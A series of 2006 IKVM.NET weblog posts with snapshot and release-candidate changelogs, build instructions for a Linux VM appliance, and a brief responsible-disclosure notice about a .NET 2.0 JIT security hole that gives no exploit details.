<P>Note in particular that Java enums are represented as nested .NET enum types (automatically generated by ikvmc whenever it encounters a public&nbsp;enum) and that Java class literals&nbsp;are represented as .NET Type literals. These mappings are required because .NET attributes (like Java annotations) cannot have arbitrary types as parameters.<BR><BR>List of changes: 
<UL>
<LI>Updated to current GNU Classpath cvs version. 
<LI>Many AWT improvements (done by Volker Berlin, who now has cvs commit access). 
<LI>Fixed bug in handling of annotation parameters of type Class. 
<LI>Changed System.mapLibraryName to look at os.name system property and support the Mac OS X naming convention (but note that os.name needs to be explicitly set to "Mac OS X" for this to work). 
<LI>Implemented most of the support needed to use annotations as .NET attributes. This includes generating a nested .NET enum named __Enum for Java enums (to make them usable in .NET attributes). Using annotations as attribute parameters is not supported (i.e. in .NET languages, for Java code annotations work as specified.)</LI></UL>
<P>Binaries are available <A href="http://www.frijters.net/ikvmbin-0.33.2553.zip">here</A>. Source is available in cvs.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2006 09:20:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fbbd04d7-e98e-4e59-bb7e-9e0c48e8c6a5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fbbd04d7-e98e-4e59-bb7e-9e0c48e8c6a5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 11 December 2006</h2></div>
<div class="newsItems"><a name="aba80cb7d-377b-4012-a907-614c9db95f6e"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.32 rc1</h3>
	<div class="entryBody">
		<P>Here's the release candidate. Updated japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.</P>
<P>Changes since previous snapshot: </P>
<UL>
<LI>Integrated GNU Classpath 0.93.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.32.0.0.zip">ikvm-0.32.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.32.0.0.zip">ikvmbin-0.32.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.32.0.0.zip">ikvmbin-generics-0.32.0.0.zip</A> (binaries built from generics branch))</P>
<P>As usual the binaries in ikvmbin-0.32.0.0.zip are signed and the generics binaries are not signed (and should be considered experimental and are not as well tested as the signed binaries). Post 0.93 the GNU Classpath generics branch will go away and be merged into the main branch.</P>
<P>I going on vacation tomorrow and will be back on the 21st. Please test this rc in the mean time ;-) When I get back I will do the official release.</P>
<P><STRONG>Update:</STRONG> As Andrew John Hughes&nbsp;points out in the comments, the GNU Classpath generics merge is now done. I've modified the ikvm build to support this and checked these changes in.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/11/2006 09:43:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ba80cb7d-377b-4012-a907-614c9db95f6e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ba80cb7d-377b-4012-a907-614c9db95f6e">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 07 December 2006</h2></div>
<div class="newsItems"><a name="a3b9e044f-673d-462b-a16e-222a862f1df3"></a><div class="entry">
	<h3 class="entryTitle">.NET Framework 2.0 Security Hole</h3>
	<div class="entryBody">
		<P>Yesterday I discovered a bug in the JIT that not only causes incorrect results, but also allows the type system to be circumvented, which in turn leads to the possibility of arbitrary code execution. I have a proof-of-concept that executes arbitrary x86 code from a verifiable and partially trusted C# application.</P>
<P>I reported the bug to Microsoft and it turns out that it was independently discovered and reported by someone else in August (but who, I believe, did not understand the security implications of the bug). The bug was subsequently fixed in September and the fix made it into the Vista release of the .NET Framework 2.0 (so if you're running Vista, you're not vulnerable.)</P>
<P>They tell me that a fix will be distributed via Windows Update "sometime in the next few months". If you don't want to be vulnerable in the mean time, disable running .NET code in the browser and don't&nbsp;run any ClickOnce applications from untrusted sources.</P>
<P>I will publish my proof-of-concept and analysis after the patch is released.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/07/2006 07:45:59 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3b9e044f-673d-462b-a16e-222a862f1df3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3b9e044f-673d-462b-a16e-222a862f1df3">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 05 December 2006</h2></div>
<div class="newsItems"><a name="a1af6fcc9-07c0-418d-825b-0a8ca5e447d5"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>Final snapshot before the 0.32 release candidate (due after GNU Classpath 0.93 is released).</P>
<UL>
<LI>Integrated GNU Classpath 0.93 cvs branch.</LI>
<LI>Fixed type sealing optimization to take -privatepackage option into account.</LI>
<LI>Fixed line number table encoding bug (for line number deltas &gt; 8191).</LI>
<LI>Fixed array to support internal accessibility (@ikvm.lang.Internal annotation or ikvmc -privatepackage option).</LI>
<LI>Switched to using NAnt-0.85 (release) for building.</LI>
<LI>Unforked gnu.classpath.Pointer. GNU Classpath native code that uses Pointer can now be used as-is.</LI>
<LI>Removed various gnu.classpath.Pointer hacks from compiler and runtime.</LI>
<LI>Removed handcoded DirectByteBufferImpl methods from map.xml</LI>
<LI>Forked DirectByteBufferImpl and merged in MappedByteBufferImpl functionality. DirectByteBufferImpl now uses .NET type System.Runtime.InteropServices.Marshal to do direct buffer manipulation and uses a PhantomReference to schedule cleanup.</LI>
<LI>Updated FileChannelImpl to use new DirectByteBufferImpl instead of MappedByteBufferImpl.</LI>
<LI>Changed FileChannelImpl to directly use win32 boolean instead of polymorphism, for the few platform specific operations.</LI>
<LI>Fixed regression introduced in previous snapshot. IsErasedOrBoxedPrimitiveOrRemapped should only return true for Java primitives, not all .NET primitives.</LI>
<LI>Added check to ikvmc to make sure that all assemblies required by referenced assemblies are available.</LI>
<LI>Added attempted workaround for c++/cli compiler bug <A href="https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=234167">https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=234167</A></LI>
<LI>Fixed Socket.soLingerOption(false) handling.</LI>
<LI>Added String.format() methods. (Note that they delegate to GNU Classpath's java.util.Formatter which isn't yet fully functional.)</LI>
<LI>Changed class file parser to accept version 50 (Java 6) class files (the StackMapTable attribute is still ignored though).</LI>
<LI>Fixed ikvmc to make the stub methods that exist to hide System.Object and System.Exception methods from java.lang.Object and java.lang.Throwable do a virtual call on the methods they hide, instead of a non-virtual call.</LI>
<LI>Removed public instancehelper_finalize() and instancehelper_clone() methods from java.lang.Object &amp; java.lang.Throwable. This required some relatively ugly hacks, but having these protected methods callable by anyone was not acceptable from a security p.o.v. so hacks are a necessary evil. As a side effect, these hacks made it possible to implement clone() for types that extend cli.System.Object and cli.System.Exception (as long as they implement the java.lang.Cloneable interface to signal that they are OK with being cloned).</LI>
<LI>Enabled IKVM.AWT.WinForms.dll target on Linux.</LI>
<LI>Changed AssemblyClassLoader (Java code) to keep track of the Assembly it corresponds to.</LI>
<LI>Implemented some simple codegen optimizations in CountingILGenerator.</LI>
<LI>Implemented resource loading delegation for assembly class loaders.</LI>
<LI>Added support (albeit a little hacky) for generating class stubs for .NET generic type instances.</LI>
<LI>Added ikvmc -externalresource option to link external files as resources (i.e. instead of embedding the resource in the assembly, only a filename and hash are added to the assembly manifest.)</LI>
<LI>Pre-linked .NET method wrappers, to fix problem with .NET generic types in signatures.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2530.zip">ikvmbin-0.31.2530.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/05/2006 08:57:09 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1af6fcc9-07c0-418d-825b-0a8ca5e447d5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1af6fcc9-07c0-418d-825b-0a8ca5e447d5">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 28 November 2006</h2></div>
<div class="newsItems"><a name="aa084ff53-e981-4085-9cd4-8d392451f7c3"></a><div class="entry">
	<h3 class="entryTitle">Linux Build Environment</h3>
	<div class="entryBody">
		<P>M. David Peterson has created a Linux Virtual Appliance that can be used to build IKVM.NET from source in a Linux environment without requiring a lot of complicated setup.</P>
<UL>
<LI>Download the appliance VMWare image from <A href="http://www.rpath.org/rbuilder/project/nuxleus/release?id=5209">http://www.rpath.org/rbuilder/project/nuxleus/release?id=5209</A></LI>
<LI>Boot it up inside VMWare (Player)</LI>
<LI>Log in as <CODE>root</CODE> (no password)</LI>
<LI>Run "<CODE>conary update --replace-files group-devel=conary.rpath.com@rpl:1</CODE>"&nbsp; to get the development tools</LI>
<LI>Run "<CODE>conary update cli-gac-tag</CODE>" to install the ikvm assemblies into the GAC.</LI>
<LI>Run "<CODE>cvs -z3 -d:pserver:anonymous@ikvm.cvs.sourceforge.net:/cvsroot/ikvm co -P ikvm</CODE>" to get IKVM.NET from cvs.</LI>
<LI>Run "<CODE>cvs -z3 -d:pserver:anonymous@cvs.savannah.gnu.org:/sources/classpath co classpath</CODE>" to get GNU Classpath from cvs.</LI>
<LI>Change into the <CODE>ikvm</CODE> directory and run <CODE>nant</CODE>.</LI></UL>
<P>That's it!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/28/2006 07:28:13 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a084ff53-e981-4085-9cd4-8d392451f7c3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a084ff53-e981-4085-9cd4-8d392451f7c3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 14 November 2006</h2></div>
<div class="newsItems"><a name="a3620697a-52f4-4067-9afa-863b3066317b"></a><div class="entry">
	<h3 class="entryTitle">Sun Open Sourcing Java</h3>
	<div class="entryBody">
		<P>Yesterday Sun <A href="http://www.sun.com/software/opensource/java/">announced</A> that they will be releasing their Java platform implementations under the <A href="http://www.gnu.org/copyleft/gpl.html">GPL v2</A> (+ <A href="http://www.gnu.org/software/classpath/license.html">Classpath exception</A> for the J2SE libraries). This is great news for the Java ecosystem and for IKVM.NET as well, of course.</P>
<P>A few people have mailed me to ask what this means specifically for IKVM. Here are my current plans (subject to change, as always): When the GPL version of the Java 7 libraries will be released, I will start working on integrating them with IKVM. Some parts of the libraries are not owned by Sun, so there will be holes in what they release, hopefully these can be filled soon (for example by code from GNU Classpath.)</P>
<P>The Sun libraries obviously use native code to interface with the OS, for IKVM this is not ideal (JNI is slow and native code much less secure and robust than managed code), so where feasible I will continue to use my current "native" implementations (e.g. socket and file i/o) based on the .NET Framework.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/14/2006 07:44:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3620697a-52f4-4067-9afa-863b3066317b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3620697a-52f4-4067-9afa-863b3066317b">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 11 October 2006</h2></div>
<div class="newsItems"><a name="a7939cbcf-8d5a-4f3d-91ed-a88c83790f3f"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>New snapshot where I've reintroduced netmodule support. I think that was the final issue resulting from the assembly class loader architecture change, but, as always, I welcome feedback.</P>
<P>Changes:</P>
<UL>
<LI>Added modreq(IsVolatile) support for WHIDBEY target.</LI>
<LI>Fixed a bug in ikvmc's detection of incompatible assemblies (compiled with another version of ikvm).</LI>
<LI>Added support for specifying partial names in ikvmc -reference option (this is most useful for .NET Framework assemblies, e.g. you can now say -r:mscorlib).</LI>
<LI>Fixed NullReferenceException in AssemblyClassLoader when one of the referenced assemblies is not available.</LI>
<LI>Changed class.map and pkg.lst from resources to custom attributes, to better support modules that are merged together (WARNING: merging ikvmc generated modules with modules generated by other compiler is *not* supported)</LI>
<LI>Added support for multi-module assemblies (each module in a multi-module assembly can be written in a different language [but J# is still not suppored]).</LI>
<LI>Added optimization to ikvmc to seal private types that do not have subclasses.</LI>
<LI>Removed global DefineClass lock.</LI>
<LI>Constant fields no longer have a CLR backing field in dynamic mode.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2475.zip">ikvmbin-0.31.2475.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/11/2006 07:35:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7939cbcf-8d5a-4f3d-91ed-a88c83790f3f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7939cbcf-8d5a-4f3d-91ed-a88c83790f3f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 04 October 2006</h2></div>
<div class="newsItems"><a name="a5b574486-1b2a-4df5-a69c-baeee52a38aa"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>Yet another new snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Fixed java.lang.Byte implementation of IFormattable to treat byte as a signed number.</LI>
<LI>Changed ikvm.lang.CIL boxing methods for built-in primitives to no longer do the actual boxing, but instead simply return the passed in value as another type, the call site will then do the boxing (if required).</LI>
<LI>Fixed field reflection to support overloaded field names.</LI>
<LI>Fixed a bunch of metadata regressions introduced in 0.31 with the changes made to final field handling.</LI>
<LI>Deprecated final fields that are compiled as properties now have the properties marked with ObsoleteAttribute.</LI>
<LI>Added support for encoding method/field signatures with types that look different in the Java world, but are actually the same in the CLR signatures (e.g. you can now have a method that takes or returns cli.System.Object or cli.System.Int32).</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2468.zip">ikvmbin-0.31.2468.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/04/2006 11:33:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=5b574486-1b2a-4df5-a69c-baeee52a38aa"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=5b574486-1b2a-4df5-a69c-baeee52a38aa">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 October 2006</h2></div>
<div class="newsItems"><a name="afd7308b4-798d-462e-9417-43f1083381a3"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>Again, a new snapshot. This time with some new magic to make Java boxed primitives integrate a little better with .NET string formatting. The following code now produces the expected result:</P>
<P><SPAN style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">class</SPAN><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> test<BR>{<BR>&nbsp; <SPAN style="COLOR: blue">public</SPAN> <SPAN style="COLOR: blue">static</SPAN> <SPAN style="COLOR: blue">void</SPAN> main(String[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; cli.System.Console.WriteLine("Java Magic = {0:X}", 0xCAFEBABE);<BR>&nbsp;&nbsp;&nbsp; cli.System.Console.WriteLine("Pi is approx. = {0:N2}", Math.PI);<BR>&nbsp; }<BR>}</SPAN></P>
<P>To enable this, the Java box classes have to implement IFormattable. I added support to the remapping infrastructure for this:</P>
<P><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN style="COLOR: blue">&lt;</SPAN><SPAN style="COLOR: maroon">class</SPAN><SPAN style="COLOR: fuchsia"> </SPAN><SPAN style="COLOR: red">name</SPAN><SPAN style="COLOR: blue">="java.lang.Double"&gt;<BR></SPAN>&nbsp; <SPAN style="COLOR: blue">&lt;</SPAN><SPAN style="COLOR: maroon">implements</SPAN><SPAN style="COLOR: fuchsia"> </SPAN><SPAN style="COLOR: red">class</SPAN><SPAN style="COLOR: blue">="cli.System.IFormattable"&gt;<BR></SPAN>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">&lt;</SPAN><SPAN style="COLOR: maroon">method<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">name</SPAN><SPAN style="COLOR: blue">="ToString"</SPAN><BR><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">sig</SPAN><SPAN style="COLOR: blue">="(Ljava.lang.String;Lcli.System.IFormatProvider;)Ljava.lang.String;"&gt;<BR></SPAN>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">&lt;</SPAN><SPAN style="COLOR: maroon">redirect<BR></SPAN><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">class</SPAN><SPAN style="COLOR: blue">="ikvm.internal.Formatter"</SPAN><BR><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">type</SPAN><SPAN style="COLOR: blue">="static"</SPAN><BR><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">name</SPAN><SPAN style="COLOR: blue">="ToString"</SPAN><BR><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: red">sig</SPAN><SPAN style="COLOR: blue">="(Ljava.lang.Double;Ljava.lang.String;Lcli.System.IFormatProvider;)Ljava.lang.String;"<BR></SPAN><SPAN style="COLOR: #ff00ff">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN><SPAN style="COLOR: blue">/&gt;<BR></SPAN>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">&lt;/</SPAN><SPAN style="COLOR: maroon">method</SPAN><SPAN style="COLOR: blue">&gt;<BR></SPAN>&nbsp; <SPAN style="COLOR: blue">&lt;/</SPAN><SPAN style="COLOR: maroon">implements</SPAN><SPAN style="COLOR: blue">&gt;<BR>&lt;/</SPAN><SPAN style="COLOR: maroon">class</SPAN><SPAN style="COLOR: blue">&gt;</SPAN></SPAN></P>
<P>The ToString helper method is trivial:</P>
<P><SPAN style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><SPAN style="COLOR: blue">public</SPAN> <SPAN style="COLOR: blue">static</SPAN> String ToString(Double d, String format, IFormatProvider provider)<BR>{<BR>&nbsp; <SPAN style="COLOR: blue">return</SPAN> ((IFormattable)CIL.box_double(d.doubleValue())).ToString(format, provider);<BR>}</SPAN></P>
<P>Note that from the Java side this is mostly invisible (the exception being that you can now cast a java.lang.Double to cli.System.IFormattable, even though the interface is not visible thru reflection).</P>
<P>Changes:</P>
<UL>
<LI>Added workaround for mono <A href="http://bugzilla.ximian.com/show_bug.cgi?id=79522">bug</A>.</LI>
<LI>Added support for specifying java class names in map.xml attribute parameters of type System.Type.</LI>
<LI>Added support to remapping infrastructure for adding interfaces to classes (invisible to Java code).</LI>
<LI>Made java.lang.Byte, Short, Integer, Long, Float and Double implement IFormattable (privately, so this is invisible to Java code).</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2466.zip">ikvmbin-0.31.2466.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/02/2006 09:27:16 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fd7308b4-798d-462e-9417-43f1083381a3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fd7308b4-798d-462e-9417-43f1083381a3">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 26 September 2006</h2></div>
<div class="newsItems"><a name="a2eb31e4e-98b9-4500-b42e-c0724396608e"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>More fixes and nio improvements and a regression fix.</P>
<P>Changes:</P>
<UL>
<LI>Fixed SocketChannel.close() (was broken in previous snapshot).</LI>
<LI>Added support to VMThread for custom interruptable code regions.</LI>
<LI>Implemented SocketChannel interruptability and asynchronous close.</LI>
<LI>Implemented ServerSocketChannel interruptability and asynchronous close.</LI>
<LI>Almost completely rewrote SelectorImpl to fix many bugs and implement interruptability.</LI>
<LI>Fixed PlainDatagramSocketImpl.receive() to ignore WSAECONNRESET errors.</LI>
<LI>Optimized SelectorImpl to not create a new wakeup socket for each select.</LI>
<LI>Fixed regression introduced in 0.31 that caused NullReferenceException if a class had explicitly defined write-only properties (specified in an xml mapping file).</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2460.zip">ikvmbin-0.31.2460.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/26/2006 07:01:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2eb31e4e-98b9-4500-b42e-c0724396608e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2eb31e4e-98b9-4500-b42e-c0724396608e">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 22 September 2006</h2></div>
<div class="newsItems"><a name="af5b3ec98-423a-4eca-94c8-9faad49c10cb"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>More nio fixes. <A href="http://azureus.sourceforge.net/">Azureus</A> now works (sort of anyway). I also added a workaround for a bug in mcs that was exposed by my recent changes in the way final fields are handled.</P>
<P>Changes:</P>
<UL>
<LI>Added workaround for <A href="http://bugzilla.ximian.com/show_bug.cgi?id=79451">mcs bug</A>. 
<LI>More nio fixes. Selector now works much better. Lots more work still needed.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2456.zip">ikvmbin-0.31.2456.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/22/2006 07:59:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f5b3ec98-423a-4eca-94c8-9faad49c10cb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f5b3ec98-423a-4eca-94c8-9faad49c10cb">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 20 September 2006</h2></div>
<div class="newsItems"><a name="a0fa106f8-9ed4-4a86-b6d3-c315603b5400"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot. Most significant change is the almost complete rewrite of the nio code, triggered by the GNU Classpath nio rewrite. The test coverage for nio is fairly abysmal, so hopefully I haven't introduced too many regressions. On the whole the new code should be equivalent to or better than the previous version, but there still remains a lot to be done.</P>
<P>Changes:</P>
<UL>
<LI>Updated to current GNU Classpath cvs version. 
<LI>Fixed streaming sockets to support SO_REUSEADDR socket option.</LI>
<LI>Changed ikvmc -resource option to strip unnecessary leading slash from resource name.</LI>
<LI>More code restructuring.</LI>
<LI>Added tracing to assembly resource and class loading.</LI>
<LI>Fixed ikvmstub to export non-public outer classes when an inner class is exported.</LI>
<LI>Simplified "save debug image" code to emit ikvmdump.dll instead of ikvmdump.exe (the resulting file has not been executable for a while, so it made no sense to pretend it was).</LI>
<LI>Rewrite of nio socket support code.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2454.zip">ikvmbin-0.31.2454.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/20/2006 08:16:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0fa106f8-9ed4-4a86-b6d3-c315603b5400"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0fa106f8-9ed4-4a86-b6d3-c315603b5400">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 05 September 2006</h2></div>
<div class="newsItems"><a name="a89f34de3-1fdb-4325-95fd-1106c4829670"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot with mainly bug fixes and code restructuring.</P>
<P>Changes:</P>
<UL>
<LI>Updated to current GNU Classpath cvs version.</LI>
<LI>Fixed Class.forName() regression introduced in 0.28. Doing a Class.forName() on a .NET type using the assembly qualified name wouldn't run the class initializer.</LI>
<LI>Fixed System.arraycopy() performance regression introduced in 0.31 for ikvmc compiled code.</LI>
<LI>Changed java.lang.ref.Reference not to use a WeakReference if the referent is a Class object (since IKVM doesn't&nbsp;support Class gc, it would be a waste).</LI>
<LI>Fixed java.lang.ref.Reference memory leak (a reference associated with a ReferenceQueue would stay around until the referent was GCed).</LI>
<LI>Changed ikvmc to "critical fail" if it triggers a TypeResolve event. If you encounter these, please report them.</LI>
<LI>Fixed stub generator to set inner class access flags correctly in outer class InnerClasses attribute. Previously javac didn't recognize the Annotation inner interface in .NET custom attribute classes as annotation because the annotation bit wasn't set in the outer class.</LI>
<LI>Regenerated mscorlib.jar and System.jar. Removed System.Xml.jar.</LI>
<LI>Fixed bug in VMObjectStreamClass.hasClassInitializer that could cause it to throw a System.NotSupportedException on an array type when the element type was an unfinished dynamic type.</LI>
<LI>Fixed a bug in the hack that looks up the TimeZone.</LI>
<LI>Added IsErased and IsDynamicOnly properties to TypeWrapper.</LI>
<LI>Changed delegate handling to no longer emit the Method interface, but instead use static binding to the target method when possible and otherwise generate dynamic code.</LI>
<LI>Introduced generic handling of DynamicOnly interfaces (both the "Method" and "Annotation" interfaces in respectively delegates and custom attributes are now represented as DynamicOnly types -- i.e. they are implemented entirely through reflection.)</LI>
<LI>Changed bytecode compiler to call ikvm.runtime.getClassFromTypeHandle instead of IKVM.Runtime.GetClassFromTypeHandle for ldc &lt;class&gt; to remove the need to downcast the resulting object to Class.</LI>
